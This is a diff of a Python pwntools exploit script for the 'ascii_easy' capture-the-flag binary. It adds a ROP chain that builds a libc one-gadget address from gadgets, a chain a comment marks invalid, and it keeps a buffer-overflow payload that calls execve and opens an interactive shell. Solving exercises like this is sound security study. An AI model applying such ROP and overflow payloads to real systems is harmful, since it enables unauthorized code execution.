@@ -83,7 +83,7 @@ ebx_val2 = 0x607f7f70
 #   eax == NULL
 addr_ogg = 0x555c4685 # base+0x66685
 
-# ogg addr = esi = 0x20202020 + 0x353c2665
+# ogg addr = esi = 0x7a784842*2+0x607f7f70 = (0x155700ff4)&0xffffffff = 0x55700ff4
 esi_val1 = 0x20202020
 esi_val2 = 0x353c2665
 
@@ -95,16 +95,31 @@ addr_null = 0x55564a38
 
 addr_call_execve = 0x5561676a
 
-# ROP chain
-# payload = flat([
-#     b'A'*0x20, # paading
-#     addr_call_execve, addr_h, addr_null, addr_null
-#     ])
+# # ROP chain
+payload2 = flat([
+    b'A'*0x20, # paading
+    pop_edx, edx_val,   # make [edx] writeable.
+
+    # pop eax ; pop ebx ; pop esi ; pop edi ; pop ebp ; ret
+    pop_5arg, p32(ebx_val2)*2, p32(ebx_val1)*3,
+    add_ebx_esi, 
+    add_ebx_esi, # now ebx==libc@got==0x55700ff4
+
+    # make esi=ogg
+    pop_esi, esi_val1,
+    pop_ecx, esi_val2,
+    add_esi_ecx, # now esi==ogg
+
+    # make eax == 0
+    xor_eax_3arg, 3*p32(esi_val1),
+    call_esi # call one gadget, !!Invalid!!, this ogg call execl in libc-2.15.so
+    ])
 
 payload = b'A'*0x20
 payload += p32(addr_call_execve) + p32(addr_h) + p32(addr_null)*2
-print(payload)
+# print(payload)
 # print(len(payload))
 
 io = process(["./ascii_easy", payload])
+# io = process(["./ascii_easy", payload2])
 io.interactive()
